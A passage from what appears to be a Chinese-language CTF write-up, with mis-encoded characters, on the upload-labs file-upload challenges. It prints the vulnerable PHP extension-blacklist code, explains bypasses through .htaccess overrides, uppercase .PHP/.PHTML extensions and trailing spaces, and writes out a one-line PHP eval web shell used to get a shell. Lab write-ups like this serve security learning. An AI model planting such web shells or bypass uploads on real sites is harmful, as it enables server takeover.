href="#4-3-ä»£ç å®¡è®¡" class="headerlink" title="4.3 ä»£ç å®¡è®¡"></a>4.3 ä»£ç å®¡è®¡</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-17%2018.10.12.png" style="zoom:50%;"><p>é»‘åå•banæ‰äº†éå¸¸å¤šçš„åç¼€ï¼Œæƒ³å¯»æ‰¾ä¸€ä¸ªæ²¡è¢«banæ‰çš„æŒºéš¾çš„ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pHp1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ”¶å°¾å»ç©º</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ£€æµ‹çš„é€»è¾‘è·Ÿ<code>Pass-03</code>ä¸€æ ·ï¼Œå°±æ˜¯banæ‰çš„åç¼€å¤ªå¤šäº†ï¼Œæƒ³æ‰¾åˆ°ä¸€ä¸ªèƒ½ç”¨çš„æ¯”è¾ƒéš¾ã€‚é‚£å°±ä¸æ‰¾äº†ï¼Œå°±ä¸Šä¼ æ–‡ä»¶ååˆæ³•çš„æ–‡ä»¶ï¼Œç„¶åé€šè¿‡è¦†ç›–é…ç½®æ–‡ä»¶ï¼ŒæŒ‡å®šæœåŠ¡å™¨å°†åˆæ³•æ–‡ä»¶åï¼ˆå¦‚.jpgï¼‰å½“ä½œphpæ–‡ä»¶è§£æï¼Œå®ç°æ›²çº¿æ•‘å›½ã€‚<br>       æœ¬æ¥ä»¥ä¸ºè¿™ä¸€å…³ä¼šæ˜¯å•æ£€æµ‹æ–‡ä»¶å†…å®¹ï¼Œä½†å…¶å®è¿™ç§æ›´å¥½ç»•è¿‡ï¼Œæ„é€ åˆæ³•é­”æœ¯å¤´å°±è¡Œäº†ï¼Œå†éš¾ä¸€ç‚¹çš„å…¶å®æ˜¯MIME+å¤§é»‘åå•åç¼€+å†…å®¹æ£€æµ‹ã€‚è¯´ç™½äº†å¦‚æœæ£€æµ‹æ‰‹æ®µå¤šç®¡é½ä¸‹ï¼Œæƒ³ç»•è¿‡è‚¯å®šä¼šæ›´éš¾ã€‚</p><h1 id="äº”ã€Pass-05ï¼ˆåç«¯åç¼€åæ£€æµ‹-å¤§å†™ç»•è¿‡ï¼‰"><a href="#äº”ã€Pass-05ï¼ˆåç«¯åç¼€åæ£€æµ‹-å¤§å†™ç»•è¿‡ï¼‰" class="headerlink" title="äº”ã€Pass-05ï¼ˆåç«¯åç¼€åæ£€æµ‹-å¤§å†™ç»•è¿‡ï¼‰"></a>äº”ã€Pass-05ï¼ˆåç«¯åç¼€åæ£€æµ‹-å¤§å†™ç»•è¿‡ï¼‰</h1><h2 id="5-1-é¢˜é¢"><a href="#5-1-é¢˜é¢" class="headerlink" title="5.1 é¢˜é¢"></a>5.1 é¢˜é¢</h2><p>åŒå‰é¢çš„å…³å¡ã€‚</p><h2 id="5-2-è§£é¢˜"><a href="#5-2-è§£é¢˜" class="headerlink" title="5.2 è§£é¢˜"></a>5.2 è§£é¢˜</h2><p>ä¸Šä¼ yjh.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sxkk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŠ“åŒ…åˆ†æï¼š</p><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250120204729379.png" alt="image-20250120204729379"></p><ul><li><p>å°†.phpä¿®æ”¹ä¸º.jpgï¼ŒæˆåŠŸä¸Šä¼ =&gt;æ²¡æœ‰æ£€æµ‹æ–‡ä»¶å¤´ã€‚</p></li><li><p>+ä¿®æ”¹content-typeä¸ºtext/phpï¼ŒæˆåŠŸä¸Šä¼ =&gt;æ²¡æœ‰æ£€æµ‹MIMEç±»å‹</p></li><li><p>å°è¯•ä¿®æ”¹åç¼€ç»•è¿‡ï¼š .PHP æˆåŠŸä¸Šä¼ </p></li></ul><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250120205120238.png" alt="image-20250120205120238"></p><p>å°è¯•è®¿é—®ï¼š</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250120205238780.png" alt="image-20250120205238780"><p>è²Œä¼¼å·²ç»è¢«è§£ææ‰§è¡Œï¼Ÿå°è¯•èšå‰‘è¿æ¥ï¼š</p><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250120205456323.png" alt="image-20250120205456323"></p><p>getshellï¼š</p><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250120205534174.png" alt="image-20250120205534174"></p><p>flagï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>31c446e4-0d77-4f1f-aa3b-2476fc72ce8c<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-3-ä»£ç å®¡è®¡"><a href="#5-3-ä»£ç å®¡è®¡" class="headerlink" title="5.3 ä»£ç å®¡è®¡"></a>5.3 ä»£ç å®¡è®¡</h2><p>çœ‹ä¸‹è¿™ä¸€å…³çš„æç¤ºï¼š</p><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250120205627602.png" alt="image-20250120205627602"></p><p>banæ‰çš„åç¼€æ¯”è¾ƒå¤šï¼Œ.htaccessæ–‡ä»¶éƒ½è¢«banæ‰äº†ï¼Œä½†æ˜¯å·§äº†ï¼Œæˆ‘å°è¯•çš„.PHPåç¼€æ­£å¥½åœ¨é»‘åå•ä¹‹å¤–ã€‚</p><p>åŒç†ï¼Œå°è¯•ä¸€ä¸‹PHTMLåç¼€çœ‹ä¸‹èƒ½ä¸èƒ½ç»•è¿‡ï¼š</p><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250120205923516.png" alt="image-20250120205923516"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸä¸Šä¼ äº†ï¼Œå¹¶ä¸”ä¹Ÿèƒ½å¤Ÿgetshellã€‚</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250120210026903.png" alt="image-20250120210026903" style="zoom:80%;"><p>æ‰€ä»¥è¿™å…³è¿˜æ˜¯è€ƒå¯Ÿé»‘åå•ç»•è¿‡ã€‚å¦‚æ­¤çœ‹æ¥ï¼ŒPass-04æ˜¯å¦ä¹Ÿå¯ä»¥é€šè¿‡.PHP æˆ– .PHTMLåç¼€ç»•è¿‡ï¼Ÿ</p><p>çœ‹ä¸‹æºä»£ç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//é¦–å°¾å»ç©º</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>strrchr()</code> æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²å‡½æ•°ï¼Œç”¨äºæŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¹¶è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²æœ«å°¾çš„æ‰€æœ‰å†…å®¹ã€‚å¦‚æœæœªæ‰¾åˆ°æŒ‡å®šçš„å­—ç¬¦æˆ–å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å› <code>false</code>ã€‚</p><p><code>str_ireplace()</code> æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²æ›¿æ¢å‡½æ•°ï¼Œç”¨äºå°†å­—ç¬¦ä¸²ä¸­çš„æŸäº›å†…å®¹æ›¿æ¢ä¸ºå…¶ä»–å†…å®¹ã€‚ä¸ <code>str_replace()</code> ä¸åŒï¼Œ<code>str_ireplace()</code> æ˜¯å¤§å°å†™ä¸æ•æ„Ÿçš„ï¼Œå³å®ƒä¼šå¿½ç•¥å¤§å°å†™å·®å¼‚è¿›è¡Œæ›¿æ¢ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯ï¼š</p><ul><li>åœ¨å˜é‡ <code>$file_ext</code> ä¸­æŸ¥æ‰¾å­—ç¬¦ä¸² <code>'::$DATA'</code>ï¼ˆå¤§å°å†™ä¸æ•æ„Ÿï¼‰ã€‚</li><li>å°†æ‰¾åˆ°çš„ <code>'::$DATA'</code> æ›¿æ¢ä¸ºç©ºå­—ç¬¦ä¸² <code>''</code>ã€‚</li><li>è¿”å›æ›¿æ¢åçš„ç»“æœã€‚</li></ul></blockquote><p>ä»”ç»†åˆ†æä»£ç ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯Pass04ä¸­ä½¿ç”¨äº†<code>$file_ext = strtolower($file_ext);</code>å°†åç¼€è½¬åŒ–ä¸ºäº†å°å†™ï¼ˆè€Œæœ¬å…³Pass-05å¹¶æ²¡æœ‰åšå¤§å°å†™è½¬æ¢ï¼‰ï¼Œæ‰€ä»¥.PHPä¹Ÿæ— æ³•ç»•è¿‡Pass04çš„é»‘åå•ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/image-20250120211015206.png" alt="image-20250120211015206"></p><p>è¿™ä¹ˆçœ‹æ¥Pass-05è¦æ¯”Pass-04ç®€å•ã€‚</p><p>æŒ‰ç…§è§£é¢˜æ€è·¯æ¥è®²ï¼Œåº”è¯¥å…ˆå°è¯•ä½¿ç”¨å†·é—¨åç¼€ç»•è¿‡é»‘åå•ï¼Œç»•ä¸è¿‡å†ä½¿ç”¨.htaccessæ–‡ä»¶è¦†ç›–é…ç½®è§£æjpgæ–‡ä»¶ï¼ŒPass05åº”è¯¥åœ¨Pass04ä¹‹å‰æ‰èƒ½æœ‰ç§å¾ªåºæ¸è¿›çš„å‘³é“ã€‚</p><h1 id="å…­ã€Pass-06-ï¼ˆåç¼€åå°¾éƒ¨ç©ºæ ¼ç»•è¿‡-windows-ï¼‰"><a href="#å…­ã€Pass-06-ï¼ˆåç¼€åå°¾éƒ¨ç©ºæ ¼ç»•è¿‡-windows-ï¼‰" class="headerlink" title="å…­ã€Pass-06*ï¼ˆåç¼€åå°¾éƒ¨ç©ºæ ¼ç»•è¿‡(windows)ï¼‰"></a>å…­ã€Pass-06*ï¼ˆåç¼€åå°¾éƒ¨ç©ºæ ¼ç»•è¿‡(windows)ï¼‰</h1><h2 id="6-1-é¢˜é¢"><a href="#6-1-é¢˜é¢" class="headerlink" title="6.1 é¢˜é¢"></a>6.1 é¢˜é¢</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2016.14.34.png" style="zoom:40%;"><p>è·Ÿå‰é¢å‡ å…³ä¸€æ ·ã€‚</p><h2 id="6-2-è§£é¢˜"><a href="#6-2-è§£é¢˜" class="headerlink" title="6.2 è§£é¢˜"></a>6.2 è§£é¢˜</h2><p>ä¸Šä¼ yjh.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-22%2016.16.18.png" style="zoom:50%;"><p>æŠ“åŒ…ï¼š</p><img 